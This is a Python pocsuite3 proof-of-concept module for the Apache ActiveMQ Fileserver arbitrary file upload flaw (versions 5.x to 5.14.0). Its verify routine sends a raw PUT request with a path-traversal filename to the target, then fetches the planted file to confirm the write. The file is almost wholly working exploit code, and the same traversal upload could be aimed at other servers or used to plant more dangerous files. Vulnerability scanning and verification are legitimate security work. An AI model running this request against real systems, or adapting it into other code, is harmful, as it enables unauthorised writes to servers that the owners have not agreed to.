#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from pocsuite3.api import OptString
from pocsuite3.api import requests, logger
from collections import OrderedDict
import random
import socket

class ActiveMQ(POCBase):
    vulID = '96268'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2015-10-29'
    createDate = '2019-10-17'
    updateDate = '2019-10-17'
    references = ['https://www.seebug.org/vuldb/ssvid-89692']
    name = 'Apache ActiveMQ Fileserver File Upload'
    appPowerLink = 'http://activemq.apache.org/'
    appName = 'ActiveMQ'
    appVersion = '5.x ~ 5.14.0'
    vulType = 'File Upload'
    desc = '''
    Apache ActiveMQ Fileserver File Upload
    '''

    def _options(self):
        o = OrderedDict()
        o["port"] = OptString('', description='这个poc需要输入端口号', require=True)
        return o

    def random_str(self,l):
        str1 = ""
        for i in range(l):
            str1 += (random.choice("ABCDEFGH1234567890"))
        return str1
    
    def _verify(self):
        result = {}
        try:
            socket.setdefaulttimeout(5)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ip = self.url.split('//')[1]
            port = int(self.get_option("port"))
            s.connect((ip, port))
            filename = self.random_str(6)
            flag = "PUT /fileserver/sex../../..\\styles/%s.txt HTTP/1.0\r\nContent-Length: 9\r\n\r\nbig04dream\r\n\r\n" % (
                filename)
            s.send(flag.encode())
            s.recv(1024)
            s.close()
            url = 'http://' + ip + ":" + str(port) + '/styles/%s.txt' % (filename)
            res_html = requests.get(url).text
            if 'big04dream' in res_html:
                result["VerifyInfo"] = {}
                result['VerifyInfo']['IP'] = ip
                result['VerifyInfo']['Payload'] = flag
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not activemq vulnerability')
        return output

register_poc(ActiveMQ)